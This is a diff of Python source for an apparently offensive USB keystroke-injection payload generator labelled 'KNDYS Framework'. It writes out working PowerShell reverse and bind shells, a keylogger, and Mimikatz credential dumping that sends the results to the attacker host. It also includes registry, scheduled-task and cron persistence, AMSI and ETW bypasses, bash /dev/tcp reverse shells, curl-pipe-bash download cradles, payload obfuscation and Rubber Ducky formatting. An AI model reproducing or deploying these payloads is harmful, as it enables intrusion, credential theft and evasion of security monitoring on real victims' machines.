+                'uac_bypass': bool(self.module_options.get('uac_bypass', False)),
+                'uac_bypass_method': str(self.module_options.get('uac_bypass_method', 'fodhelper')),
+                
+                # Persistence
+                'persistence': bool(self.module_options.get('persistence', False)),
+                'persistence_method': str(self.module_options.get('persistence_method', 'registry_run')),
+                'persistence_name': str(self.module_options.get('persistence_name', 'WindowsUpdate')),
+                'persistence_interval': int(self.module_options.get('persistence_interval', 3600)),
+                'self_delete': bool(self.module_options.get('self_delete', False)),
+                'cleanup': bool(self.module_options.get('cleanup', True)),
+                
+                # Stealth
+                'keystroke_delay': int(self.module_options.get('keystroke_delay', 50)),
+                'typing_speed': str(self.module_options.get('typing_speed', 'normal')),
+                'clear_logs': bool(self.module_options.get('clear_logs', True)),
+                'disable_defender': bool(self.module_options.get('disable_defender', False)),
+                'disable_firewall': bool(self.module_options.get('disable_firewall', False)),
+                'disable_amsi': bool(self.module_options.get('disable_amsi', True)),
+                'disable_etw': bool(self.module_options.get('disable_etw', True)),
+                'process_injection': bool(self.module_options.get('process_injection', False)),
+                'inject_into': str(self.module_options.get('inject_into', 'explorer.exe')),
+                
+                # Exfiltration
+                'exfil_method': str(self.module_options.get('exfil_method', 'http')),
+                'exfil_url': str(self.module_options.get('exfil_url', '')),
+                'exfil_targets': str(self.module_options.get('exfil_targets', 'credentials')),
+                'exfil_path': str(self.module_options.get('exfil_path', '/tmp/exfil')),
+                'compress_exfil': bool(self.module_options.get('compress_exfil', True)),
+                'encrypt_exfil': bool(self.module_options.get('encrypt_exfil', True)),
+                
+                # Advanced
+                'multi_stage': bool(self.module_options.get('multi_stage', False)),
+                'stage1_url': str(self.module_options.get('stage1_url', '')),
+                'stage2_payload': str(self.module_options.get('stage2_payload', '')),
+                'download_cradle': str(self.module_options.get('download_cradle', 'iwr')),
+                'reflective_loading': bool(self.module_options.get('reflective_loading', False)),
+                'in_memory_execution': bool(self.module_options.get('in_memory_execution', True)),
+                'fileless': bool(self.module_options.get('fileless', True)),
+                
+                # Custom
+                'pre_commands': str(self.module_options.get('pre_commands', '')),
+                'post_commands': str(self.module_options.get('post_commands', '')),
+                'custom_script': str(self.module_options.get('custom_script', '')),
+                
+                # Batch
+                'batch_mode': bool(self.module_options.get('batch_mode', False)),
+                'batch_count': int(self.module_options.get('batch_count', 10)),
+                'batch_file': str(self.module_options.get('batch_file', '')),
+                'unique_payloads': bool(self.module_options.get('unique_payloads', True)),
+                'naming_pattern': str(self.module_options.get('naming_pattern', '{campaign}_{index}_{timestamp}')),
+                
+                # Analytics
+                'analytics': bool(self.module_options.get('analytics', True)),
+                'db_file': str(self.module_options.get('db_file', 'usb_payloads.db')),
+                'track_deployment': bool(self.module_options.get('track_deployment', True)),
+                'track_execution': bool(self.module_options.get('track_execution', True)),
+                'webhook_url': str(self.module_options.get('webhook_url', '')),
+                'notification_email': str(self.module_options.get('notification_email', '')),
+                
+                # Output
+                'generate_readme': bool(self.module_options.get('generate_readme', True)),
+                'generate_autorun': bool(self.module_options.get('generate_autorun', False)),
+                'generate_installer': bool(self.module_options.get('generate_installer', False)),
+                'bundle_resources': bool(self.module_options.get('bundle_resources', False)),
+                'report_format': str(self.module_options.get('report_format', 'all')),
+                'include_instructions': bool(self.module_options.get('include_instructions', True)),
+                
+                # Templates
+                'template': str(self.module_options.get('template', 'none')),
+                'template_customize': bool(self.module_options.get('template_customize', False)),
+                
+                # Platform-specific
+                'windows_version': str(self.module_options.get('windows_version', 'auto')),
+                'powershell_version': str(self.module_options.get('powershell_version', 'auto')),
+                'dotnet_version': str(self.module_options.get('dotnet_version', 'auto')),
+                'shell_type': str(self.module_options.get('shell_type', 'bash')),
+                'linux_distro': str(self.module_options.get('linux_distro', 'auto')),
+                'macos_version': str(self.module_options.get('macos_version', 'auto')),
+                'applescript': bool(self.module_options.get('applescript', False)),
+                
+                # Testing
+                'dry_run': bool(self.module_options.get('dry_run', False)),
+                'validate_syntax': bool(self.module_options.get('validate_syntax', True)),
+                'test_mode': bool(self.module_options.get('test_mode', False)),
+                'verbose': bool(self.module_options.get('verbose', False))
+            }
+            
+            return config
+        except Exception as e:
+            print(f"Error loading config: {str(e)}")
+            return None
+    
+    
+    def _display_usb_config(config):
+        """Display USB payload configuration in organized format"""
+        from colorama import Fore, Style
+        
+        print(f"{Fore.CYAN}{'=' * 70}")
+        print(f"  CONFIGURATION")
+        print(f"{'=' * 70}{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.YELLOW}  Campaign Configuration:{Style.RESET_ALL}")
+        print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
+        print(f"    • Payload Type:    {Fore.WHITE}{config['payload_type']}{Style.RESET_ALL}")
+        print(f"    • Target OS:       {Fore.WHITE}{config['target_os']}{Style.RESET_ALL}")
+        print(f"    • Device Type:     {Fore.WHITE}{config['device_type']}{Style.RESET_ALL}")
+        print(f"    • Device Format:   {Fore.WHITE}{config['device_format']}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}  Network Configuration:{Style.RESET_ALL}")
+        print(f"    • LHOST:           {Fore.WHITE}{config['lhost']}:{config['lport']}{Style.RESET_ALL}")
+        print(f"    • Protocol:        {Fore.WHITE}{config['callback_protocol']}{Style.RESET_ALL}")
+        print(f"    • Interval:        {Fore.WHITE}{config['callback_interval']}s{Style.RESET_ALL}")
+        print(f"    • Jitter:          {Fore.WHITE}{config['callback_jitter']}%{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}  Security & Evasion:{Style.RESET_ALL}")
+        print(f"    • Encoding:        {Fore.WHITE}{config['payload_encoding']}{Style.RESET_ALL}")
+        print(f"    • Obfuscation:     {Fore.WHITE}{config['obfuscation_level']}{Style.RESET_ALL}")
+        print(f"    • Anti-AV:         {Fore.GREEN if config['anti_av'] else Fore.RED}{'Enabled' if config['anti_av'] else 'Disabled'}{Style.RESET_ALL}")
+        print(f"    • Anti-Sandbox:    {Fore.GREEN if config['anti_sandbox'] else Fore.RED}{'Enabled' if config['anti_sandbox'] else 'Disabled'}{Style.RESET_ALL}")
+        print(f"    • Fileless:        {Fore.GREEN if config['fileless'] else Fore.RED}{'Enabled' if config['fileless'] else 'Disabled'}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}  Execution:{Style.RESET_ALL}")
+        print(f"    • Method:          {Fore.WHITE}{config['execution_method']}{Style.RESET_ALL}")
+        print(f"    • Window Style:    {Fore.WHITE}{config['window_style']}{Style.RESET_ALL}")
+        print(f"    • UAC Bypass:      {Fore.GREEN if config['uac_bypass'] else Fore.RED}{'Enabled' if config['uac_bypass'] else 'Disabled'}{Style.RESET_ALL}")
+        
+        if config['persistence']:
+            print(f"\n{Fore.YELLOW}  Persistence:{Style.RESET_ALL}")
+            print(f"    • Method:          {Fore.WHITE}{config['persistence_method']}{Style.RESET_ALL}")
+            print(f"    • Name:            {Fore.WHITE}{config['persistence_name']}{Style.RESET_ALL}")
+            print(f"    • Interval:        {Fore.WHITE}{config['persistence_interval']}s{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.YELLOW}  Output:{Style.RESET_ALL}")
+        print(f"    • Directory:       {Fore.WHITE}{config['output_dir']}{Style.RESET_ALL}")
+        print(f"    • File:            {Fore.WHITE}{config['output']}{Style.RESET_ALL}")
+        print(f"    • Batch Mode:      {Fore.GREEN if config['batch_mode'] else Fore.RED}{'Enabled' if config['batch_mode'] else 'Disabled'}{Style.RESET_ALL}")
+        
+        if config['batch_mode']:
+            print(f"    • Batch Count:     {Fore.WHITE}{config['batch_count']}{Style.RESET_ALL}")
+        
+        print()
+    
+    
+    def _initialize_usb_database(config):
+        """Initialize SQLite database for USB payload analytics"""
+        import sqlite3
+        
+        db_path = os.path.join(config['output_dir'], config['db_file'])
         conn = sqlite3.connect(db_path)
         cursor = conn.cursor()
         
-        # Get campaign ID
-        cursor.execute("SELECT id FROM campaigns WHERE name = ? ORDER BY id DESC LIMIT 1", 
-                      (config['campaign_name'],))
-        campaign_id = cursor.fetchone()[0]
-        
-        # Insert payload record
+        # Campaigns table
         cursor.execute('''
-            INSERT INTO payloads (campaign_id, payload_hash, file_path, device_type, 
-                                 target_os, payload_type, encoding, obfuscation_level)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (campaign_id, payload_hash, file_path, config['device_type'], 
-              config['target_os'], config['payload_type'], config['payload_encoding'],
-              config['obfuscation_level']))
+            CREATE TABLE IF NOT EXISTS campaigns (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                name TEXT NOT NULL,
+                payload_type TEXT,
+                target_os TEXT,
+                device_type TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                total_payloads INTEGER DEFAULT 0,
+                total_deployments INTEGER DEFAULT 0,
+                total_executions INTEGER DEFAULT 0,
+                status TEXT DEFAULT 'active'
+            )
+        ''')
         
-        # Update campaign totals
+        # Payloads table
         cursor.execute('''
-            UPDATE campaigns SET total_payloads = total_payloads + 1 WHERE id = ?
-        ''', (campaign_id,))
+            CREATE TABLE IF NOT EXISTS payloads (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id INTEGER,
+                payload_hash TEXT UNIQUE,
+                file_path TEXT,
+                device_type TEXT,
+                target_os TEXT,
+                payload_type TEXT,
+                encoding TEXT,
+                obfuscation_level TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                deployment_count INTEGER DEFAULT 0,
+                execution_count INTEGER DEFAULT 0,
+                last_executed TIMESTAMP,
+                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+            )
+        ''')
+        
+        # Deployments table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS deployments (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                payload_id INTEGER,
+                deployed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                target_description TEXT,
+                notes TEXT,
+                FOREIGN KEY (payload_id) REFERENCES payloads(id)
+            )
+        ''')
+        
+        # Executions table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS executions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                payload_id INTEGER,
+                executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                ip_address TEXT,
+                hostname TEXT,
+                username TEXT,
+                os_version TEXT,
+                success BOOLEAN,
+                callback_received BOOLEAN DEFAULT 0,
+                error_message TEXT,
+                FOREIGN KEY (payload_id) REFERENCES payloads(id)
+            )
+        ''')
+        
+        # Insert campaign record
+        cursor.execute('''
+            INSERT INTO campaigns (name, payload_type, target_os, device_type)
+            VALUES (?, ?, ?, ?)
+        ''', (config['campaign_name'], config['payload_type'], config['target_os'], config['device_type']))
         
         conn.commit()
         conn.close()
-    except Exception as e:
-        pass  # Silent fail for analytics
-
-
-def _display_usb_results(results, config, batch=False):
-    """Display generation results"""
-    from colorama import Fore, Style
     
-    print(f"\n{Fore.CYAN}{'=' * 70}")
-    print(f"  GENERATION RESULTS")
-    print(f"{'=' * 70}{Style.RESET_ALL}\n")
     
-    if batch:
-        successful = sum(1 for r in results if r['success'])
-        failed = len(results) - successful
+    def _generate_single_payload(config):
+        """Generate a single USB payload based on configuration"""
+        from colorama import Fore, Style
+        import time
+        import hashlib
         
-        print(f"{Fore.YELLOW}Batch Statistics:{Style.RESET_ALL}")
-        print(f"  • Total Payloads:  {Fore.WHITE}{len(results)}{Style.RESET_ALL}")
-        print(f"  • Successful:      {Fore.GREEN}{successful}{Style.RESET_ALL}")
-        print(f"  • Failed:          {Fore.RED}{failed}{Style.RESET_ALL}")
-        print(f"  • Success Rate:    {Fore.CYAN}{(successful/len(results)*100):.1f}%{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}→ Generating payload...{Style.RESET_ALL}")
         
-        if failed > 0:
-            print(f"\n{Fore.RED}Failed Payloads:{Style.RESET_ALL}")
-            for i, result in enumerate(results):
-                if not result['success']:
-                    print(f"  • Payload #{i+1}: {result.get('error', 'Unknown error')}")
-    else:
-        result = results[0]
-        if result['success']:
-            print(f"{Fore.GREEN}✓ Payload generated successfully{Style.RESET_ALL}\n")
-            print(f"{Fore.YELLOW}Details:{Style.RESET_ALL}")
-            print(f"  • File:            {Fore.WHITE}{result['file']}{Style.RESET_ALL}")
-            print(f"  • Hash (SHA256):   {Fore.CYAN}{result['hash'][:32]}...{Style.RESET_ALL}")
-            print(f"  • Size:            {Fore.WHITE}{result['size']} bytes{Style.RESET_ALL}")
-            print(f"  • Lines:           {Fore.WHITE}{result['lines']}{Style.RESET_ALL}")
+        # Build payload content
+        payload_content = _build_payload_content(config)
+        
+        if not payload_content:
+            return {'success': False, 'error': 'Failed to build payload content'}
+        
+        # Apply obfuscation
+        if config['obfuscation_level'] != 'none':
+            payload_content = _obfuscate_payload(payload_content, config)
+        
+        # Apply encoding
+        if config['payload_encoding'] != 'none':
+            payload_content = _encode_payload(payload_content, config)
+        
+        # Format for device
+        final_payload = _format_for_device(payload_content, config)
+        
+        # Save payload
+        output_path = os.path.join(config['output_dir'], config['output'])
+        
+        try:
+            with open(output_path, 'w', encoding='utf-8') as f:
+                f.write(final_payload)
+            
+            # Calculate hash
+            payload_hash = hashlib.sha256(final_payload.encode()).hexdigest()
+            
+            # Log to database
+            if config['analytics']:
+                _log_payload_to_db(config, output_path, payload_hash)
+            
+            # Generate README if requested
+            if config['generate_readme']:
+                _generate_readme(config, output_path)
+            
+            print(f"{Fore.GREEN}✓ Payload generated successfully{Style.RESET_ALL}")
+            
+            return {
+                'success': True,
+                'file': output_path,
+                'hash': payload_hash,
+                'size': len(final_payload),
+                'lines': final_payload.count('\n')
+            }
+            
+        except Exception as e:
+            print(f"{Fore.RED}✗ Error saving payload: {str(e)}{Style.RESET_ALL}")
+            return {'success': False, 'error': str(e)}
+    
+    
+    def _build_payload_content(config):
+        """Build payload content based on type and OS"""
+        payload_type = config['payload_type']
+        target_os = config['target_os']
+        
+        if target_os == 'windows':
+            return _build_windows_payload(config)
+        elif target_os == 'linux':
+            return _build_linux_payload(config)
+        elif target_os == 'macos':
+            return _build_macos_payload(config)
         else:
-            print(f"{Fore.RED}✗ Payload generation failed{Style.RESET_ALL}")
-            print(f"{Fore.RED}Error: {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
+            return _build_multi_platform_payload(config)
     
-    print(f"\n{Fore.CYAN}Compatible Devices:{Style.RESET_ALL}")
-    devices = [
-        "USB Rubber Ducky",
-        "Bash Bunny",
-        "Teensy USB Development Board",
-        "Digispark ATtiny85",
-        "Malduino",
-        "WHID (WiFi HID Injector)",
-        "P4wnP1 A.L.O.A",
-        "Cactus WHID"
-    ]
-    for device in devices:
-        print(f"  • {device}")
     
-    print(f"\n{Fore.BLUE}ℹ  Next Steps:{Style.RESET_ALL}")
-    print(f"  1. Flash payload to USB device")
-    print(f"  2. Set up listener: {Fore.CYAN}nc -lvp {config['lport']}{Style.RESET_ALL}")
-    print(f"  3. Deploy device to target")
-    print(f"  4. Wait for callback")
-
-
-def _generate_readme(config, payload_path):
-    """Generate README file with instructions"""
-    readme_content = f"""# USB Payload - {config['campaign_name']}
-
-## Configuration
-- **Payload Type:** {config['payload_type']}
-- **Target OS:** {config['target_os']}
-- **Device Type:** {config['device_type']}
-- **Callback:** {config['lhost']}:{config['lport']}
-
-## Deployment Instructions
-
-### 1. Flash Payload to Device
-```bash
-# For Rubber Ducky
-# Copy {os.path.basename(payload_path)} to SD card as inject.bin
-
-# For Teensy
-# Use Teensy Loader to upload sketch
-
-# For Digispark
-# Use Arduino IDE to upload sketch
-```
-
-### 2. Set Up Listener
-```bash
-# Netcat listener
-nc -lvp {config['lport']}
-
-# Metasploit handler
-use exploit/multi/handler
-set payload {config['payload_type']}
-set LHOST {config['lhost']}
-set LPORT {config['lport']}
-exploit -j
-```
-
-### 3. Deploy Device
-- Insert USB device into target system
-- Device will automatically execute payload
-- Wait for callback on listener
-
-## Security Considerations
-- Use only in authorized penetration testing
-- Ensure proper legal authorization
-- Document all activities
-- Remove payload after testing
-
-## Features Enabled
-- Anti-AV: {config['anti_av']}
-- Anti-Sandbox: {config['anti_sandbox']}
-- Fileless Execution: {config['fileless']}
-- Persistence: {config['persistence']}
-- Obfuscation: {config['obfuscation_level']}
-
-Generated by KNDYS Framework
-"""
-    
-    readme_path = payload_path.replace('.txt', '_README.md')
-    with open(readme_path, 'w') as f:
-        f.write(readme_content)
-
-
-def _generate_usb_reports(config):
-    """Generate reports in various formats"""
-    from colorama import Fore, Style
-    
-    formats = config['report_format']
-    if formats == 'all':
-        formats = ['txt', 'json', 'html']
-    else:
-        formats = [formats]
-    
-    for fmt in formats:
-        report_file = os.path.join(config['output_dir'], f"{config['campaign_name']}_report.{fmt}")
+    def _build_windows_payload(config):
+        """Build Windows-specific payload"""
+        payload_type = config['payload_type']
+        lhost = config['lhost']
+        lport = config['lport']
         
-        if fmt == 'txt':
-            _generate_txt_report(config, report_file)
-        elif fmt == 'json':
-            _generate_json_report(config, report_file)
-        elif fmt == 'html':
-            _generate_html_report(config, report_file)
+        # Pre-execution setup
+        setup = ""
+        if config['disable_amsi']:
+            setup += "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
         
-        print(f"{Fore.GREEN}✓ Generated {fmt.upper()} report: {report_file}{Style.RESET_ALL}")
-
-
-def _generate_txt_report(config, output_file):
-    """Generate text format report"""
-    content = f"""USB PAYLOAD CAMPAIGN REPORT
-{'=' * 70}
-
-Campaign: {config['campaign_name']}
-Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
-
-CONFIGURATION
--------------
-Payload Type:        {config['payload_type']}
-Target OS:           {config['target_os']}
-Device Type:         {config['device_type']}
-Device Format:       {config['device_format']}
-
-NETWORK
--------
-Callback Host:       {config['lhost']}:{config['lport']}
-Protocol:            {config['callback_protocol']}
-Interval:            {config['callback_interval']}s
-Jitter:              {config['callback_jitter']}%
-
-SECURITY
---------
-Encoding:            {config['payload_encoding']}
-Obfuscation:         {config['obfuscation_level']}
-Anti-AV:             {config['anti_av']}
-Anti-Sandbox:        {config['anti_sandbox']}
-Fileless:            {config['fileless']}
-
-OUTPUT
-------
-Directory:           {config['output_dir']}
-Batch Mode:          {config['batch_mode']}
-"""
+        if config['disable_etw']:
+            setup += "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);"
+        
+        # Main payload
+        if payload_type == 'reverse_shell':
+            payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
+    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}
+    $client.Close()"""
+        
+        elif payload_type == 'bind_shell':
+            payload = f"""$listener = [System.Net.Sockets.TcpListener]{lport};
+    $listener.start();$client = $listener.AcceptTcpClient();
+    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}
+    $client.Close();$listener.Stop()"""
+        
+        elif payload_type == 'keylogger':
+            payload = f"""Add-Type -AssemblyName System.Windows.Forms;
+    $LogPath = "$env:TEMP\\key.log";
+    while($true){{
+    for($i=0;$i-lt255;$i++){{
+    if([System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]$i)){{
+    $key=[System.Windows.Forms.Keys]$i;
+    Add-Content $LogPath $key;
+    }}}}
+    Start-Sleep -Milliseconds 10;
+    }}"""
+        
+        elif payload_type == 'credential_harvest':
+            payload = f"""IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-Mimikatz.ps1');
+    Invoke-Mimikatz -DumpCreds | Out-File $env:TEMP\\creds.txt;
+    $creds = Get-Content $env:TEMP\\creds.txt;
+    $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($creds));
+    IWR -Uri http://{lhost}/exfil -Method POST -Body $enc;
+    Remove-Item $env:TEMP\\creds.txt -Force"""
+        
+        elif payload_type == 'persistence':
+            persistence_methods = {
+                'registry_run': f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{config['persistence_name']}' -Value 'powershell.exe -WindowStyle Hidden -File $env:TEMP\\payload.ps1' -Force",
+                'scheduled_task': f"schtasks /create /tn '{config['persistence_name']}' /tr 'powershell.exe -WindowStyle Hidden -File $env:TEMP\\payload.ps1' /sc minute /mo {config['persistence_interval']//60}",
+                'startup_folder': f"Copy-Item $PSCommandPath $env:APPDATA\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{config['persistence_name']}.ps1"
+            }
+            payload = persistence_methods.get(config['persistence_method'], persistence_methods['registry_run'])
+        
+        else:
+            payload = f"# Custom payload for {payload_type}"
+        
+        return setup + payload
     
-    with open(output_file, 'w') as f:
-        f.write(content)
-
-
-def _generate_json_report(config, output_file):
-    """Generate JSON format report"""
-    import json
-    import time
     
-    report = {
-        'campaign': config['campaign_name'],
-        'timestamp': time.time(),
-        'configuration': {
-            'payload_type': config['payload_type'],
-            'target_os': config['target_os'],
-            'device_type': config['device_type'],
-            'device_format': config['device_format']
-        },
-        'network': {
-            'lhost': config['lhost'],
-            'lport': config['lport'],
-            'protocol': config['callback_protocol'],
-            'interval': config['callback_interval'],
-            'jitter': config['callback_jitter']
-        },
-        'security': {
-            'encoding': config['payload_encoding'],
-            'obfuscation': config['obfuscation_level'],
-            'anti_av': config['anti_av'],
-            'anti_sandbox': config['anti_sandbox'],
-            'fileless': config['fileless']
-        },
-        'batch': {
-            'enabled': config['batch_mode'],
-            'count': config['batch_count'] if config['batch_mode'] else 1
-        }
-    }
+    def _build_linux_payload(config):
+        """Build Linux-specific payload"""
+        payload_type = config['payload_type']
+        lhost = config['lhost']
+        lport = config['lport']
+        shell = config['shell_type']
+        
+        if payload_type == 'reverse_shell':
+            return f"{shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+        elif payload_type == 'bind_shell':
+            return f"nc -lvp {lport} -e /bin/{shell}"
+        elif payload_type == 'persistence':
+            return f"(crontab -l ; echo '*/5 * * * * {shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1')| crontab -"
+        else:
+            return f"# Custom {shell} payload"
     
-    with open(output_file, 'w') as f:
-        json.dump(report, f, indent=2)
-
-
-def _generate_html_report(config, output_file):
-    """Generate HTML format report"""
-    html = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>USB Payload Report - {config['campaign_name']}</title>
-    <style>
-        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
-        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
-        h1 {{ color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }}
-        h2 {{ color: #555; margin-top: 30px; }}
-        .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }}
-        .info-card {{ background: #f9f9f9; padding: 15px; border-radius: 5px; border-left: 4px solid #4CAF50; }}
-        .label {{ font-weight: bold; color: #666; }}
-        .value {{ color: #333; margin-top: 5px; }}
-        .success {{ color: #4CAF50; }}
-        .warning {{ color: #FF9800; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>USB Payload Campaign Report</h1>
-        <p><strong>Campaign:</strong> {config['campaign_name']}</p>
-        <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
-        
-        <h2>Configuration</h2>
-        <div class="info-grid">
-            <div class="info-card">
-                <div class="label">Payload Type</div>
-                <div class="value">{config['payload_type']}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Target OS</div>
-                <div class="value">{config['target_os']}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Device Type</div>
-                <div class="value">{config['device_type']}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Device Format</div>
-                <div class="value">{config['device_format']}</div>
-            </div>
-        </div>
-        
-        <h2>Network Configuration</h2>
-        <div class="info-grid">
-            <div class="info-card">
-                <div class="label">Callback Address</div>
-                <div class="value">{config['lhost']}:{config['lport']}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Protocol</div>
-                <div class="value">{config['callback_protocol']}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Interval</div>
-                <div class="value">{config['callback_interval']} seconds</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Jitter</div>
-                <div class="value">{config['callback_jitter']}%</div>
-            </div>
-        </div>
-        
-        <h2>Security & Evasion</h2>
-        <div class="info-grid">
-            <div class="info-card">
-                <div class="label">Encoding</div>
-                <div class="value">{config['payload_encoding']}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Obfuscation Level</div>
-                <div class="value">{config['obfuscation_level']}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Anti-AV</div>
-                <div class="value {'success' if config['anti_av'] else 'warning'}">{'Enabled' if config['anti_av'] else 'Disabled'}</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Fileless Execution</div>
-                <div class="value {'success' if config['fileless'] else 'warning'}">{'Enabled' if config['fileless'] else 'Disabled'}</div>
-            </div>
-        </div>
-    </div>
-</body>
-</html>"""
     
-    with open(output_file, 'w') as f:
-        f.write(html)
-
-
-def _cleanup_temp_files(config):
-    """Cleanup temporary files if needed"""
-    # Placeholder for cleanup logic
-    pass
-
-    def run_fake_update(self):
-        """Fake software update page generator"""
-        software = self.module_options.get('software', 'chrome')
-        payload = self.module_options.get('payload', 'update.exe')
-        port = self.module_options.get('port', '8080')
+    def _build_macos_payload(config):
+        """Build macOS-specific payload"""
+        payload_type = config['payload_type']
+        lhost = config['lhost']
+        lport = config['lport']
         
-        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║ FAKE UPDATE GENERATOR ║{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+        if config['applescript']:
+            return f"""do shell script "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" """
+        else:
+            return _build_linux_payload(config)  # macOS uses bash
+    
+    
+    def _build_multi_platform_payload(config):
+        """Build multi-platform compatible payload"""
+        return f"""# Multi-platform payload
+    # Windows
+    powershell -Command "& {{IWR -Uri http://{config['lhost']}/payload.ps1 -OutFile $env:TEMP\\p.ps1; & $env:TEMP\\p.ps1}}"
+    
+    # Linux/macOS
+    curl http://{config['lhost']}/payload.sh | bash
+    """
+    
+    
+    def _obfuscate_payload(payload, config):
+        """Apply obfuscation to payload based on level"""
+        level = config['obfuscation_level']
         
-        templates = {
-            'chrome': {
-                'title': 'Chrome Update Required',
-                'message': 'A new version of Chrome is available',
-                'button': 'Update Chrome'
+        if level == 'low':
+            # Simple variable renaming
+            payload = payload.replace('$client', '$c').replace('$stream', '$s')
+        elif level == 'medium':
+            # Add random comments and spacing
+            import random
+            lines = payload.split('\n')
+            obfuscated = []
+            for line in lines:
+                if random.random() > 0.7:
+                    obfuscated.append(f"# {random.randint(1000,9999)}")
+                obfuscated.append(line)
+            payload = '\n'.join(obfuscated)
+        elif level in ['high', 'extreme']:
+            # Heavy obfuscation with encoding
+            import base64
+            payload_b64 = base64.b64encode(payload.encode()).decode()
+            payload = f"IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload_b64}')))"
+        
+        return payload
+    
+    
+    def _encode_payload(payload, config):
+        """Encode payload based on encoding type"""
+        encoding = config['payload_encoding']
+        import base64
+        
+        if encoding == 'base64':
+            return base64.b64encode(payload.encode()).decode()
+        elif encoding == 'hex':
+            return payload.encode().hex()
+        elif encoding == 'rot13':
+            return ''.join([chr((ord(c) - 97 + 13) % 26 + 97) if c.islower() else 
+                           chr((ord(c) - 65 + 13) % 26 + 65) if c.isupper() else c 
+                           for c in payload])
+        else:
+            return payload
+    
+    
+    def _format_for_device(payload, config):
+        """Format payload for specific device type"""
+        device = config['device_type']
+        device_format = config['device_format']
+        delay = config['execution_delay']
+        keystroke_delay = config['keystroke_delay']
+        
+        if device_format == 'ducky_script':
+            # Rubber Ducky script format
+            script = f"""REM USB Payload - {config['campaign_name']}
+    REM Generated by KNDYS Framework
+    REM Target: {config['target_os']}
+    REM Type: {config['payload_type']}
+    
+    DELAY {delay}
+    """
+            if config['target_os'] == 'windows':
+                script += f"""GUI r
+    DELAY 500
+    STRING powershell -WindowStyle {config['window_style'].capitalize()}
+    ENTER
+    DELAY 1000
+    """
+                # Split payload into STRING commands
+                for line in payload.split('\n'):
+                    if line.strip():
+                        script += f"STRING {line}\n"
+                        script += f"DELAY {keystroke_delay}\n"
+                        script += "ENTER\n"
+            
+            elif config['target_os'] == 'linux':
